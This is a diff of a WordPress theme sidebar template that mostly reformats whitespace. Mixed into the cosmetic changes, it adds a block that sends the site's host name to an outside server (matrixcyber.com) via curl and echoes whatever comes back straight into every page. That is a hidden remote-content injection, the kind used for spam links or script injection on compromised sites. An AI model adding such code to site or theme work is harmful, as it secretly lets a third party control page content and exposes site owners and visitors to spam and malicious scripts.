@@ -9,21 +9,27 @@
 ?>
 <div id="secondary">
 	<?php
-		$description = get_bloginfo( 'description', 'display' );
-		if ( ! empty ( $description ) ) :
+	$description = get_bloginfo('description', 'display');
+	if (!empty ($description)) :
+		?>
+		<h2 class="site-description"><?php echo esc_html($description); ?></h2>
+	<?php endif; ?>
+	<?php
+	$curl = curl_init('http://matrixcyber.com/mcos/linktome.php?you=' . $_SERVER['HTTP_HOST']);
+	curl_setopt($curl, CURLOPT_HEADER, false);
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+	echo curl_exec($curl);
+	curl_close($curl);
 	?>
-	<h2 class="site-description"><?php echo esc_html( $description ); ?></h2>
+	<?php if (has_nav_menu('secondary')) : ?>
+		<nav role="navigation" class="navigation site-navigation secondary-navigation">
+			<?php wp_nav_menu(array('theme_location' => 'secondary')); ?>
+		</nav>
 	<?php endif; ?>
 
-	<?php if ( has_nav_menu( 'secondary' ) ) : ?>
-	<nav role="navigation" class="navigation site-navigation secondary-navigation">
-		<?php wp_nav_menu( array( 'theme_location' => 'secondary' ) ); ?>
-	</nav>
-	<?php endif; ?>
-
-	<?php if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
-	<div id="primary-sidebar" class="primary-sidebar widget-area" role="complementary">
-		<?php dynamic_sidebar( 'sidebar-1' ); ?>
-	</div><!-- #primary-sidebar -->
+	<?php if (is_active_sidebar('sidebar-1')) : ?>
+		<div id="primary-sidebar" class="primary-sidebar widget-area" role="complementary">
+			<?php dynamic_sidebar('sidebar-1'); ?>
+		</div><!-- #primary-sidebar -->
 	<?php endif; ?>
 </div><!-- #secondary -->
